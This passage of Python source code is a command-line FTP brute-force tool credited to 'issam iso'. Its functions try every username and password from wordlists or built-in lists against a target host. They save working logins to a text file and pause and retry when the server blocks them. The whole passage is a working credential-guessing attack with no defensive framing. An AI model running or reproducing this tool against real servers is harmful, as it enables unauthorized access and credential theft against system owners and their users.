def ftp_brute_users_ap(__host__,__port__,userlist,times):
	ckeak_file(userlist)
	#ckeak_file(passlist)
	user_list=open(userlist,'r').readlines()
	#pass_list=open(passlist,'r').readlines()
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} userlist : {userlist}
{B}[+]{W} passlist : __passlists__
	''')
	for i in  user_list:
		i=i.strip()
		users.append(i)
	for user in users:
		user=user.strip()
		for pasw in __passlists__:
			pasw=pasw.strip()
			try:
				ftp=ftplib.FTP()
				ftp.connect(__host__,__port__,timeout=times)
				ftp.login(user,pasw)
				ftp.quit()
				print(G+f'[+] {W}login username {G}{user}  {W} password{G} {pasw}{W}')
				file=open(__host__+'.txt','a')
				file.write(f'\nusername : {user} password : {pasw} host :{__host__} port : {str(__port__)}\n')
				file.close()
			except KeyboardInterrupt:
				users.clear()
				break
				sys.exit()
			except ftplib.error_perm:
				print(W+f'[*] try login username{R} {user} {W}  password{R} {pasw}'+W)
				ifb.append('ftp')
			except ConnectionRefusedError:
				if len(ifb) != 0:
					print(R+f'[!] block port {str(__port__)} sleep 10 Seconds'+W)
					time.sleep(10)
					continue
				if len(ifb) == 0:
					print(R+f'[!] port({str(__port__)}) Error ')
					sys.exit()
			except OSError:
				if len(ifb) != 0:
					print(R+f'[!] block {__host__}:{str(__port__)} sleep 10 Seconds'+W)
					time.sleep(10)
					continue
				if len(ifb) == 0:
					print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
					sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
######### auto_user passlist
def ftp_brute_auouses_pwds(__host__,__port__,passlist,times):
	#ckeak_file(userlist)
	ckeak_file(passlist)
	#user_list=open(userlist,'r').readlines()
	pass_list=open(passlist,'r').readlines()
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} userlist : __userlists__
{B}[+]{W} passlist : {passlist}
	''')
	for user in __userlists__:
		user=user.strip()
		for pasw in pass_list:
			pasw=pasw.strip()
			try:
				ftp=ftplib.FTP()
				ftp.connect(__host__,__port__,timeout=times)
				ftp.login(user,pasw)
				ftp.quit()
				print(G+f'[+] {W}login username {G}{user}  {W} password{G} {pasw}{W}')
				file=open(__host__+'.txt','a')
				file.write(f'\nusername : {user} password : {pasw} host :{__host__} port : {str(__port__)}\n')
				file.close()
			except KeyboardInterrupt:
				users.clear()
				break
				sys.exit()
			except ftplib.error_perm:
				print(W+f'[*] try login username{R} {user} {W}  password{R} {pasw}'+W)
				ifb.append('ftp')
			except ConnectionRefusedError:
				if len(ifb) != 0:
					print(R+f'[!] block port {str(__port__)} sleep 10 Seconds'+W)
					time.sleep(10)
					continue
				if len(ifb) == 0:
					print(R+f'[!] port({str(__port__)}) Error ')
					sys.exit()
			except OSError:
				if len(ifb) != 0:
					print(R+f'[!] block {__host__}:{str(__port__)} sleep 10 Seconds'+W)
					time.sleep(10)
					continue
				if len(ifb) == 0:
					print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
					sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
# auto passlist-jusernamea
def ftp_brute_user_plist_user_jusers(__host__,__port__,username,times):
	#ckeak_file(passlist)
	#__passlist__=open(passlist,'r').readlines()
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} username : {username}
{B}[+]{W} passlist : __passlists__
	''')	
	for pasw in __passlists__:
		pasw=pasw.strip()
		try:
			ftp=ftplib.FTP()
			ftp.connect(__host__,__port__,timeout=times)
			ftp.login(username,pasw)
			ftp.quit()
			print(G+f'[+] {W}login username {G}{username}  {W} password{G} {pasw}{W}')
			file=open(__host__+'.txt','a')
			file.write(f'\nusername : {username} password : {pasw} host :{__host__} port : {str(__port__)}\n')
			file.close()
		except KeyboardInterrupt:
			users.clear()
			break
			sys.exit()
		except ftplib.error_perm:
			print(W+f'[*] try login username{R} {username} {W}  password{R} {pasw}'+W)
			ifb.append('ftp')
		except ConnectionRefusedError:
			if len(ifb) != 0:
				print(R+f'[!] block port {str(__port__)} sleep 10 Seconds'+W)
				time.sleep(10)
				continue
			if len(ifb) == 0:
				print(R+f'[!] port({str(__port__)}) Error ')
				sys.exit()
		except OSError:
			if len(ifb) != 0:
				print(R+f'[!] block {__host__}:{str(__port__)} sleep 10 Seconds'+W)
				time.sleep(10)
				continue
			if len(ifb) == 0:
				print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
				sys.exit()
		except Exception as ex:
			print(R+'[!] '+str(ex))
# passwd ussrauto
def ftp_brute_usersauto_passwd(__host__,__port__,passwd,times):
	#ckeak_file(userlist)
#	user_list=open(userlist,'r').readlines()
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} userlist : __useists__
{B}[+]{W} password : {passwd}
	''')
	for user in __userlists__:
		user=user.strip()
		try:
			ftp=ftplib.FTP()
			ftp.connect(__host__,__port__,timeout=times)
			ftp.login(user,passwd)
			ftp.quit()
			print(G+f'[+] {W}login username {G}{user}  {W} password{G} {passwd}{W}')
			file=open(__host__+'.txt','a')
			file.write(f'\nusername : {user} password : {passwd} host :{__host__} port : {str(__port__)}\n')
			file.close()
		except KeyboardInterrupt:
			users.clear()
			break
			sys.exit()
		except ftplib.error_perm:
			print(W+f'[*] try login username{R} {user} {W}  password{R} {passwd}'+W)
			ifb.append('ftp')
		except ConnectionRefusedError:
			if len(ifb) != 0:
				print(R+f'[!] block port {str(__port__)} sleep 10 Seconds'+W)
				time.sleep(10)
				continue
			if len(ifb) == 0:
				print(R+f'[!] port({str(__port__)}) Error ')
				sys.exit()
		except OSError:
			if len(ifb) != 0:
				print(R+f'[!] block {__host__}:{str(__port__)} sleep 10 Seconds'+W)
				time.sleep(10)
				continue
			if len(ifb) == 0:
				print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
				sys.exit()
		except Exception as ex:
			print(R+'[!] '+str(ex))
def __parse__():
	parse=argparse.ArgumentParser(description=R+'Coded By issam iso'+W)
	parse.add_argument('--host',help='host ip')
	parse.add_argument('--port',help='port ftp default 21',type=int)
	parse.add_argument('--userlist',help='username wordlist')
	parse.add_argument('--passlist',help='password wordlist')
	parse.add_argument('--user',help='one username')
	parse.add_argument('--passwd',help='one password')
	parse.add_argument('--timeout',help='time out login default 2 ',type=int)
	parse.add_argument('--aup',help='auto add username list and password list',action='store_true')
	parse.add_argument('--ap',help='auto add password list',action='store_true')
	parse.add_argument('--au',help='auto add username list',action="store_true")
	arg=parse.parse_args()
	if arg.host:
		host=arg.host
		if arg.timeout:timeout=arg.timeout
		if not arg.timeout:timeout=2
		if arg.port:port=arg.port
		if not arg.port:port=21
		if arg.userlist and arg.passlist:
			userlist=arg.userlist
			passlist=arg.passlist
			try:
				ftp_brute(host,port,userlist,passlist,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
		if arg.userlist and arg.passwd:
			userlist=arg.userlist
			passwd=arg.passwd
			try:
				ftp_brute_user_plist(host,port,userlist,passwd,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
		if arg.user and arg.passlist:
			username=arg.user
			passlist=arg.passlist
			try:
				ftp_brute_user_plist_user(host,port,username,passlist,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
		if arg.user and arg.passwd:
			user=arg.user
			passwd=arg.passwd
			ftp_brute_j_login(host,port,user,passwd,timeout)
		if arg.aup:
			try:
				ftp_brtue_aup(host,port,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
		if arg.userlist and arg.ap:
			userlist=arg.userlist
			try:
				ftp_brute_users_ap(host,port,userlist,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
		if arg.au and arg.passlist:
			passlist=arg.passlist
			try:
				ftp_brute_auouses_pwds(host,port,passlist,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
		if arg.user and arg.ap:
			user=arg.user
			try:
				ftp_brute_user_plist_user_jusers(host,port,user,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
		if arg.passwd and arg.au:
			passwd=arg.passwd
			try:
				ftp_brute_usersauto_passwd(host,port,passwd,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))			
		if arg.ap and arg.au:
			try:
				ftp_brtue_aup(host,port,timeout)
			except KeyboardInterrupt:
				sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
__parse__()
